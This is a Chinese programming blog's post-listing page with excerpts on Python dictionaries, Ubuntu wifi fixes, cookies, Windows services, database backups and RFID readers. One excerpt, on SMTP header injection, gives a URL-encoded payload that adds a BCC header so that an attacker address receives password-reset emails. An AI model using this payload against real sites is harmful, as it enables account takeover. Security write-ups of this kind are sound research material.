<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/055e0e162209bd9426f57651aa7c2b95/" rel="bookmark">
			【Python】字典内容写入json文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python中有序字典和无序字典，一键多值字典。
Python将字典内容写入json文件。
1、无序字典 目前了解三种，在Python中直接默认的是无序字典，这种不会按照你插入的顺序排序，即使你对字典排序后，返回的也是一个list变量，而不是字典，倘若你将这个list字典后，又会变回无序字典。
例子如下：
import operator x = {"label": "haha", "data": 234, "score": 0.3} sorted_x = sorted(x.items(), key=operator.itemgetter(0)) print x print type(x) print sorted_x print type(sorted_x) print dict(sorted_x) 2、有序字典 如果我们想保持字典按照我们插入的顺序有序怎么办？可以用OrderedDict来初始化字典。
例子如下：
from collections import OrderedDict x = OrderedDict() x["label"] = "haha" x["data"] = 234 x["score"] = 0.3 print x print type(x) 3、一键多值字典 如果我们想用一键多值字典怎么办，可以使用defaultdict，例子如下：
from collections import defaultdict video = defaultdict(list) video["label"].append("haha") video["data"].append(234) video["score"].append(0.3) video["label"].append("xixi") video["data"].append(123) video["score"].append(0.7) print video print type(video) 4、写入json 字典内容写入json时，需要用json.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/055e0e162209bd9426f57651aa7c2b95/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9af238edca500b32b8f09529a5579f3f/" rel="bookmark">
			关于Ubuntu14.04连接无线网的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天重新安装了Ubuntu14.04系统，之前的系统因为软件安装错误整体崩盘，只能选择重新安装。但是安装完以后，发现不能连接到无线网，尝试了网上的教程，最后比较有效的是：
1.#rfkill list all
#rfkill unblock all
2、#sudo gedit /etc/modprobe.d/ideapad.conf （进入/etc/modprobe.d/文件夹下创建.conf文件，把影响无线wifi开关的设置放入到黑名单。）
3、在该文件中保存：blacklist ideapad_laptop 4、#sudo modprobe -r ideapad_laptop
重启电脑。就可以了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60bb7ee22b974402ab3f32ddc1bbf058/" rel="bookmark">
			利用SMTP头注入劫持找回密码邮件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 原Blog: http://blog.jr0ch17.com/2018/Please-email-me-your-password/
思路： 利用SMTP头注入，将攻击者email地址添加为CC或BCC，从而劫持到比如找回密码邮件（需要目标业务未对邮件地址做校验就发邮件，利用场景有限）
Payload： valid_user_address%40company.com%0D%0ABCC%3Ame%40me.com%0D%0A
解析后的结果是：
valid_user_address@company.com BCC:attacker@evil.com 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8c2252f091f6887f3f0abef706e8d566/" rel="bookmark">
			JavaScript 读取Cookie
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		读取Cookie 可以通过document.cookie直接读取cookie的内容：
var strCookie = document.cookie; 此时，strCookie是一个由该域名下的所有cookie的名/值对所组成的字符串，名/值对间以“分号加空格”分隔。为了方便查看，可以使用split()方法将cookie中的名/值对解析出来，得到一个cookie的列表。然后，再使用相应的解码方式，把cookie的值还原出来。
cookie值的解码方式，取决于之前存储cookie时所采用的编码方式。比如使用encodeComponent()函数对值进行编码，则要使用decodeComponent()函数对其值进行解码。代码如下：
function getCookie(name) { var cookies = document.cookie; var list = cookies.split("; "); // 解析出名/值对列表 for(var i = 0; i &lt; list.length; i++) { var arr = list[i].split("="); // 解析出名和值 if(arr[0] == name) return decodeURIComponent(arr[1]); // 对cookie值解码 } return "";} 说明：
许多浏览器（如Google Chrome）不支持在本地文件中直接访问cookie，所以，要确保是在Web服务器中打开文件，否则可能无法进行cookie的读写操作。虽然IE允许对本地文件的cookie的读写操作，但cookie始终是会话级别的，即使通过max-age属性延长了cookie的生存期。
从客户端读取cookie时，name与value之外的其他属性都是不可读的，也不会被提交，浏览器只会提交name与value属性。
关于作者
歪脖先生，十五年以上软件开发经验，酷爱Web开发，精通 HTML、CSS、JavaScript、jQuery、JSON、Python、Less、Bootstrap等，著有《HTML宝典》、《揭秘CSS》、《Less简明教程》、《JSON教程》、《Bootstrap2用户指南》，并全部在 GitHub 上开源。
版权声明：本文出自 歪脖网 的《HTML宝典》，欢迎在线阅读，并提出宝贵意见。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43c0d826e89024254c86fbf6b602a75a/" rel="bookmark">
			bat添加到windows服务
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1、 编写bat脚本
::注释 @echo off ::显示当前日期时间 echo %data% %time% ::切换到指定的VUE服务器工作路径 cd /d e:\ColleagueFiles\pvGrid_nanRui_demo ::执行vue服务启动命令 ::前提条件： ::1、npm install 完成 ::2、npm run dev 可以正常启动服务 ::3、指定网站可以正常浏览 npm start 在bat脚本正常启动服务后，将bat文件转为exe文件
2、 使用bat2exe工具(Quick Batch File Compiler软件)，
下载：http://www.skycn.com/soft/appid/10734.html 参考：https://jingyan.baidu.com/article/5552ef47c169e9518ffbc9d3.html 3、 将exe添加到win服务中
参考：https://zhidao.baidu.com/question/1243417068962682859.html ①、创建服务 sc create MyService binPath= "exe_Path" start= auto 1、MyService为自定义服务名称 2、exe_Path为exe路径，在cmd中可直接拖动 ②、启动服务，查看是否添加成功 services.msc ③、查询刚建立的服务 sc query MyService 4、 错误1053：服务没有及时响应启动或控制请求
参考：http://blog.51cto.com/zyliday/1421432 1、regedit，注册表 2、HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control 3、修改 ServicesPipeTimeout 值60000 如果ServicesPipeTimeout条目不存在，必须创建它。要做到这一点，请按照下列步骤操作： 1）在编辑菜单上，指向”新建”，然后单击DWORD值。 2）键入ServicesPipeTimeout，然后按ENTER键。 3）右键单击ServicesPipeTimeout，然后单击“修改”。 4）单击十进制，键入60000，然后单击“确定”。在服务超时前，该值以毫秒为单位显示时间。 5）重新启动计算机。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5932ce1e8c0299386252fc5f6fc6ee09/" rel="bookmark">
			cat实时监控-入门demo
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		昨天已经搭建好了cat服务端，今天我们来看怎么在一个ssm项目中去用cat（一个小小的demo）
1.背景：
CAT(Central Application Tracking)是由吴其敏（前大众点评首席架构师，现携程架构负责人）主导设计基于Java开发打造的实时应用监控平台，为大众点评网提供了全面的监控服务和决策支持。AT作为大众点评网基础监控组件，它已经在中间件框架（MVC框架，RPC框架，数据库框架，缓存框架等）中得到广泛应用，为点评各业务线提供系统的性能指标、健康状况、基础告警等。
2.为什么要用cat实时监控
线上发布了服务，怎么知道它一切正常，比如发布5台服务器，如何直观了解是否有请求进来，访问一切正常。当年有一次将线上的库配置到了Beta，这么低级的错误，排错花了一个通宵，十几个人。某个核心服务挂了，导致大量报错，如何确定到底是哪里出了问题。SOA带来的问题，调用XX服务出问题，很慢，是否可以衡量？应用程序有性能瓶颈，如何提供一些有效工具发现？ 3.demo
demo下载：
https://download.csdn.net/download/m0_37499059/10375430
核心代码如下：
pom.xml
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.cxx.demo&lt;/groupId&gt; &lt;artifactId&gt;cat&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;war&lt;/packaging&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;3.8.1&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.dianping.cat&lt;/groupId&gt; &lt;artifactId&gt;cat-core&lt;/artifactId&gt; &lt;version&gt;2.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.dianping.cat&lt;/groupId&gt; &lt;artifactId&gt;cat-client&lt;/artifactId&gt; &lt;version&gt;2.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.dianping.cat&lt;/groupId&gt; &lt;artifactId&gt;cat-consumer&lt;/artifactId&gt; &lt;version&gt;2.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;1.2.14&lt;/version&gt; &lt;/dependency&gt; &lt;!--spring mvc--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-web&lt;/artifactId&gt; &lt;version&gt;4.0.9.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;4.0.9.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-aop&lt;/artifactId&gt; &lt;version&gt;4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5932ce1e8c0299386252fc5f6fc6ee09/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/337c3a66ae544ca7b72db4cdc9448823/" rel="bookmark">
			HTTP提交方式之PUT详细介绍及POST和PUT的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 POST是用来提交数据的。提交的数据放在HTTP请求的正文里，目的在于提交数据并用于服务器端的存储，而不允许用户过多的更改相应数据（主要是相对于在url 修改要麻烦很多)。PUT操作是幂等的。所谓幂等是指不管进行多少次操作，结果都一样。比如我用PUT修改一篇文章，然后在做同样的操作，每次操作后的结果并没有不同POST操作既不是安全的，也不是幂等的，比如常见的POST重复加载问题：当我们多次发出同样的POST请求后，其结果是创建出了若干的资源。　安全和幂等的意义在于：当操作没有达到预期的目标时，我们可以不停的重试，而不会对资源产生副作用。从这个意义上说，POST操作往往是有害的，但很多时候我们还是不得不使用它。　还有一点需要注意的就是，创建操作可以使用POST，也可以使用PUT，区别在于POST 是作用在一个集合资源之上的（/articles），而PUT操作是作用在一个具体资源之上的（/articles/123），再通俗点说，如果URL可以在客户端确定，那么就使用PUT，如果是在服务端确定，那么就使用POST，比如说很多资源使用数据库自增主键作为标识信息，而创建的资源的标识信息到底是什么只能由服务端提供，这个时候就必须使用POST。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d1f2cb2230702f5263339a4d0803329/" rel="bookmark">
			坐标点地图匹配方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.概述
1.1.背景
随着公司业务发展，车定位轨迹数据越来越多，目前发现轨迹数据存在偏移问题，本文主要目的在于用图数据库和空间数据库来解决偏移问题，做到轨迹纠偏，将偏移的定位点放置到附近的道路上。 坐标点地图匹配方法 例如在上图中有个点不在轨迹上，也不在道路上，本文将通过计算的方法给它找到附近最近的道路上的点。
1.2.绑路方法
绑路的方法主要分为以下几个步骤： 1、获取路网数据保存至Neo4j数据库 2、将路网中的点数据保存到Postgresql数据库 3、输入一组经纬度点，分别找到每个点附近出现的在路上的点，在图数据库中查找这些点之间是否有连线关系，组成周围存在的路。 4、从周围存在的路中找到该点对于每个路线段的垂线在该路网线段的垂足，并计算垂足到该点的距离。 5、找出最近的距离的垂足作为该点绑路的点。 坐标点地图匹配方法
如上图中，就有三个备选点，分别对绑路的点对三个路网线段做垂线获得备选点，然后求垂足A、B、C与绑路的点的距离，选取A、B、C中到该点距离最短的作为结果输出。
2.数据清洗与保存
2.1.数据格式
获取的路网数据经过清洗格式如下图所示： 坐标点地图匹配方法 坐标点地图匹配方法
上图中第一幅表示连线关系第二幅为点坐标。 将连线关系和点的经纬度保存至图数据库中，将点的经纬度保存至空间数据库中。 空间数据库表格式： CREATE TABLE “public”.”roadpoint” ( “id” serial NOT NULL, “lat” float8 DEFAULT 0, “lng” float8 DEFAULT 0, “gisp” point ) WITH (OIDS=FALSE) ;
ALTER TABLE “public”.”roadpoint” OWNER TO “bmkpdev”;
COMMENT ON COLUMN “public”.”roadpoint”.”lat” IS ‘纬度’;
COMMENT ON COLUMN “public”.”roadpoint”.”lng” IS ‘经度’;
CREATE INDEX “georoadpointgis_idx” ON “public”.”roadpoint” USING gist (“gisp”) WITH (fillfactor = 85); 其中gisp是空间数据类型，后建立空间索引georoadpointgis_idx，用于检索最近的路网当中的点。 图数据库中创建点的Cypher语句如下： 创建点 create (:point {lng:114.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3d1f2cb2230702f5263339a4d0803329/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e01d939fcfe342b6f39b0ef4f7a3208/" rel="bookmark">
			【Python学习笔记】四、映射（Mapping）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		• 通过名字来引用值得数据结构称为映射
字典（Dict） • 字典是键值对(key-value pair)的无序可变集合。
（1）字典的操作 ①字典的创建
• 字典中的每个元素包含两部分：键和值。
• 键和值用冒号分隔，元素间用逗号分隔，所有元素放在一对大括号中。
d = {key1 : value1, key2 : value2 }
• 字典中的键为任意不可变对象，比如整数、实数、复数、字符串、元组等。
• 字典中的键是唯一的。
• 空字典：{}
• 使用dict()创建字典
&gt;&gt;&gt;d=dict(name=’Python’)
&gt;&gt;&gt;d
{‘name’:’Python’}
②字典的删除
dict ={'Name':'Runoob','Age':7,'Class':'First'}
del dict['Name']# 删除键 'Name'
dict.clear() #清空字典
del dict # 删除字典
③字典的读取
• 以键作为下标可以读取字典元素，若键不存在则抛出异常
• 使用字典对象的get方法获取指定键对应的值，并且可以在键不存在的时候返回指定值。如不指定，默认返回None。
④字典的添加与修改
• 当以指定键为下标为字典赋值时，若键存在，则可以修改该键的值；若不存在，则表示添加一个键、值对
• 使用字典对象的update方法将另一个字典的键、值对添加到当前字典对象
⑤字典的其他操作
len(dict)
计算字典元素个数，即键的总数。
str(dict)
输出字典，以可打印的字符串表示。
type(variable)
返回输入的变量类型，如果变量是字典就返回字典类型。
del dict[k]
删除键为k的项
del dict
删除字典dict
k in dict
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e01d939fcfe342b6f39b0ef4f7a3208/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6785cb870941207ab71986d1354661c2/" rel="bookmark">
			linux mount失败原因
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 http://support.huawei.com/enterprise/zh/knowledge/KB1000422843 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae4433f4838855d9c153eddb74eb5bb8/" rel="bookmark">
			Python list和numpy array的存储和读取方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		numpy array存储为.npy 存储：
import numpy as np numpy_array = np.array([1,2,3]) np.save('log.npy',numpy_array ) 读取：
import numpy as np numpy_array = np.load('log.npy') 运行结果：
list存储为.txt 存储：
list_log = [] list_log.append([1,2,3]) list_log.append([4,5,6,7]) file= open('log.txt', 'w') for fp in list_log: file.write(str(fp)) file.write('\n') file.close() 这样存储的结果list_log的每一行在txt也是分行的
运行结果：
读取：
file=open('log.txt', 'r') list_read = file.readlines() 读出来list_read的结果仍然是一行一行的
运行结果：
.txt文件读取为int label_path = 'C:/Users/leex/Desktop/label.txt' file = open((label_path),'r') label = [int(x.strip()) for x in file] file.close() 运行结果：
如果不加int()，则读取的为字符串格式
还有一种常见的情况是label是以one-hot编码存储的
可以用np.loadtxt读取
import numpy as np label_path = 'C:/Users/leex/Desktop/label.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae4433f4838855d9c153eddb74eb5bb8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/131a893f58f11abf085f4242fde1178f/" rel="bookmark">
			EditText横屏键盘全屏的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在EditText的属性
android:imeOptions="flagNoExtractUi|flagNoFullscreen"可以解决问题,一定要设置flagNoFullscreen否则会出现一个切换回竖屏后页面显示不全的问题 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0b0b3e4457e77651d5895ef2876f30f/" rel="bookmark">
			Thinkpad开机停在boot menu界面|进不了系统的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Thinkpad开机停在boot menu界面|进不了系统的解决方法
平原流风操作系统, 系统维护1条评论
【问题描述】：
最近在将Thinkpad E430c的ubuntu系统重装成windows 7的过程中，出现了装好win7系统后，开机自动进入boot menu界面的问题，而且不论你选择从光驱还是硬盘启动，都进不了win7，始终停留在boot menu界面。只有当连接启动U盘时，才能够通过启动U盘中的“直接从硬盘启动”的链接命令进入装好的系统。
【分析解决】：
能够进入系统，并且运行正常，说明系统安装是没有问题的。那问题的根源自然是在系统启动之前涉及到的Bios设置，又或是硬盘的引导分区表上了。
一、先从Bios设置开始，下面是我的配置过程（部分来源于网上）。
1、开机点击F1进入到bios界面。
2、进入Security—Secure Boot—Disabled。
如果不修改Secure boot选项为Disabled，在光驱引导时可能会出现报错。
3、进入Startup—UEFI/Legacy Boot选项，以下有两种选择：
1）UEFI/Legacy Boot选项选择成Both，UEFI/Legacy Boot Priority选择成UEFI First如第一幅图所示，否则安装系统时无法识别GPT分区，产生如第二幅图所示的报错“找不到驱动程序”。
2）UEFI/Legacy Boot选择成UEFI Only，CSM选择成YES。
如果选择UEFI Only，需要把CSM（Compatibility Support Module）选择YES。可以理解成是UEFI的兼容模式。使用UEFI模式安装windows7系统，Windows7的系统光盘需要使用Windows7 SP1版本。
其实，进入Startup，单击Boot，在弹出的boot启动顺序表中，我们还可以用“-/ ”号对Thinkpad的启动顺序进行合理设置。比如可以按照你此时的需要，按照硬盘、光驱、U盘等进行排序。
Bios的设置如上，但结果还是一如既往，开机仍然停留在Boot menu界面上，进不了系统，怎么办呢？自然是对磁盘的引导分区开刀了。想起以前给某台式机装XP时，系统装好后，重启，出现“Press any key……”，晕菜之余，小手抖抖，给主分区重建了一下MBR分区表，搞定！这次，估计也是这个情况了。
二、停在boot menu界面的问题的最终解决办法。
用DiskGenius，给主分区重建MBR分区表，重启，Boot menu神奇地不出现了，顺利地进入win7，O(∩_∩)O~。（系统分区自然是一定要激活的）。
PS：win7只能运行在MBR类型的磁盘上面，所以要将ubuntu系统的gpt磁盘格式转换成MBR。GPT一般不能直接转换成MBR，所以，往往采用格式化硬盘的方法更改磁盘文件格式。
讲了这么多，最后才贴出解决“Thinkpad开机停在boot menu界面的问题”的解决方法，主要是想和大家一起分享Thinkpad Bios设置的方法。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42098d3da5afec397dbeb9237bb39037/" rel="bookmark">
			xtrabackup 备份恢复过程详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		xtrabackup是Percona公司CTO Vadim参与开发的一款基于InnoDB的在线热备工具，具有开源，免费，支持在线热备，备份恢复速度快，占用磁盘空间小等特点，并且支持不同情况下的多种备份形式。xtrabackup的官方下载地址为http://www.percona.com/software/percona-xtrabackup。 xtrabackup包含两个主要的工具，即xtrabackup和innobackupex，二者区别如下： （1）xtrabackup只能备份innodb和xtradb两种引擎的表，而不能备份myisam引擎的表； （2）innobackupex是一个封装了xtrabackup的Perl脚本，支持同时备份innodb和myisam，但在对myisam备份时需要加一个全局的读锁。还有就是myisam不支持增量备份。 1.备份过程 innobackupex备份过程如下图：
（图1 innobackupex备份过程,本文中所有图都是google所得）
在图1中，备份开始时首先会开启一个后台检测进程，实时检测mysql redo的变化，一旦发现redo中有新的日志写入，立刻将日志记入后台日志文件xtrabackup_log中。之后复制innodb的数据文件和系统表空间文件ibdata1，待复制结束后，执行flush tables with read lock操作，复制.frm，MYI，MYD，等文件（执行flush tableswith read lock的目的是为了防止数据表发生DDL操作，并且在这一时刻获得binlog的位置）最后会发出unlock tables，把表设置为可读可写状态，最终停止xtrabackup_log。
2.全备恢复
这一阶段会启动xtrabackup内嵌的innodb实例，回放xtrabackup日志xtrabackup_log，将提交的事务信息变更应用到innodb数据/表空间，同时回滚未提交的事务(这一过程类似innodb的实例恢复）。恢复过程如下图：
（图2 innobackupex 恢复过程）
3.增量备份
innobackupex增量备份过程中的"增量"处理，其实主要是相对innodb而言，对myisam和其他存储引擎而言，它仍然是全拷贝(全备份)
"增量"备份的过程主要是通过拷贝innodb中有变更的"页"（这些变更的数据页指的是"页"的LSN大于xtrabackup_checkpoints中给定的LSN）。增量备份是基于全备的，第一次增备的数据必须要基于上一次的全备，之后的每次增备都是基于上一次的增备，最终达到一致性的增备。增量备份的过程如下，和全备的过程很类似，区别仅在第2步。
（ 图 3 innobackupex增量备份过程）
4.增量备份恢复
和全备恢复类似，也需要两步，一是数据文件的恢复，如图4，这里的数据来源由3部分组成：全备份，增量备份和xtrabackup log。二是对未提交事务的回滚，如图5所示：
（ 图4 innobackupex 增量备份恢复过程1）
( 图5 innobackupex增量备份恢复过程2）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9de9d116052e14420d40c2e95def1638/" rel="bookmark">
			form表单数据提交遇到跨域时
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1、一个域名网站上的form表单将数据提交到另一个域名网站上去；
利用ajax进行异步请求数据；如果是php后台接收数据，这个时候会遇到跨域的问题；在php页面的header头加上下面这个允许所有的域名访问，当然也可以写指定的域名
header('Access-Control-Allow-Origin:*');
header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept");
2、input框作为提交的按钮，将input框的type设置为button，不要设置为submit，设置为submit的话，数据提交成功之后会跳转到一个错误页面；如果是ajax数据接收最好用button,用submit提交会一直提交，容易出错。
405 - 不允许用于访问此页的 HTTP 谓词 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/520b2931db0f32d4c970c87b9105cdd0/" rel="bookmark">
			js判断数字和正整数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 js只能输入数字：
if(isNaN(num)){ alert("只能输入数字！"); return; } js只能输入正整数（不包括负整数和0）：
if(!(/(^[1-9]\d*$)/.test(num))){ alert("只能输入正整数！"); return; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a7cdc33990435c6e55c6810bf5f3b967/" rel="bookmark">
			Bean 属性拷贝 忽略大小写
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		日常java开发过程中会涉及到Bean类型转换过程，即从一个Bean通过属性拷贝的方式生成另一个Bean
通常代码如下：
TargetBean target=new TargetBean(); BeanUtils.copyProperties(param,target); 注：这里我用的是org.springframework.beans.BeanUtils
但是这种方式，是属性名完全相同的的情况下才能复制属性，
比如这种情况下 A 的属性 dwMap 到 B的属性 dwmap就无法复制。下面给出忽略大小写转换拷贝bean的写法
采用下面这种方法，dwMap 成员和dwmap成员会被认为是相同变量而发生属性复制
/** * 忽略大小写转换bean类型 * * @param obj 转换的源对象 * @param clz 目标对象 * @return 转换后的对象 */ public static &lt;T&gt; T transferObjectIgnoreCase(Object obj, Class clz) { T result = null; try { if (obj != null &amp;&amp; !obj.equals("")) { result = (T) clz.newInstance(); //获取目标类的属性集合 Map&lt;String, Field&gt; destPropertyMap = new HashMap&lt;&gt;(); for (Field curField : clz.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a7cdc33990435c6e55c6810bf5f3b967/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b3e52a47116ae8dfc9d5ab1b80bf37e/" rel="bookmark">
			RFID读写器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		读写器的组成　1．读写器的 软件 读写器的所有行为均由软件控制完成。软件向读写器发出读写命令，作为响应，读写器与电子标签之间就会建立起特定的通信。软件负责系统的控制和通信，包括控制天线发射的开关、控制读写器的工作模式、控制数据传输和控制命令交换。
2．读写器的硬件
读写器的硬件一般由天线、射频模块、控制模块和接口组成。控制模块是读写器的核心，一般由ASIC组件和微处理器组成。控制模块处理的信号通过射频模块传送给读写器天线，由读写器天线发射出去。控制模块与应用软件之间的数据交换，主要通过读写器的接口来完成。
1）控制模块。
控制模块由ASIC组件和微处理器组成。微处理器是控制模块的核心部件。ASIC组件主要用来完成逻辑加密的过程，如对读写器与电子标签之问的数据流进行加密，以减轻微处理器计算过于密集的负担。对ASIC的存取，是通过面向寄存器的微处理器总线实现的。
读写器的接口
读写器控制模块与应用软件之间的数据交换，主要通过读写器的接口来实现，接口可以采用RS-232、RS-485、RJ-45、USB2.0或WLAN接口。
读写器的设计要求
读写器在设计时需要考虑许多因素，包括基本功能、应用环境、电器性能和电路设计等。读写器在设计时需要考虑的主要因素如下。
1．读写器的基本功能和应用环境
2．读写器的电气性能
3．读写器的电路设计
低频读写器： 基于U2270B芯片的读写器
U2270B芯片的内部由振荡器、天线驱动器、电源供给电路、频率调节电路、低通滤波电路、高通滤波电路、输出控制电路等部分组成，其内部结构如图6-6所示。
高频读写器： 基于AT89S51和MF RC500的读写器系统
根据RFID原理和MF RC500的特性，可设计基于AT 89S51和MF RC500的RFID读写器系统
微波读写器 系统硬件设计与实现
1. 射频发射电路
射频发射电路完成载波以及调制信号的发射。调制方式为ASK，调制深度选用100％，发射信号的输出衰减数字可控，使用FPGA进行配置。
2. 射频接收电路
射频接收电路主要实现标签返回信号的解调。为降低后端DSP的处理难度，采用I、Q两路直接下变频的方式进行解调，如图6-18所示。
读写器工作过程中存在的一个主要问题是载波泄漏干扰。可以从以下两方面解决该问题。首先，采用ldB截止点较高的无源混频器进行混频。其次，采用移相反馈回路抵消或减弱泄漏的载波信号。
基带处理电路
基带处理电路是整个电路的控制中心，提供整个读写器硬件电路的控制信号，根据上位机的命令控制读写器的工作，包括编码、解码、CRC校验和防碰撞处理等。为了保证电路的处理速度和可扩展性，在设计中采用了DSP芯片和FPGA芯片相结合的方式
读写器发送到标签的信号称为前向信号。前向信号的编码方式为曼彻斯特编码，标签到读写器的信号称为后向信号。后向信号的编码方式为FM0编码。FM0编码又称为差动双向码。
程序设计与实现：
FPGA程序
本设计中，FPGA主要提供系统时钟、RAM的读写控制逻辑以及调试过程中后向信号的逻辑仿真。内置PLL产生的稳定时钟供DSP使用；根据DSP读写逻辑及RAM的操作产生RAM的读写时序逻辑；根据应用环境的要求产生控制发射电路输出衰减的逻辑信号。另一方面，用FPGA生成调试过程中需要的标签返回的后向信号波形，以便于调试
2. DSP程序
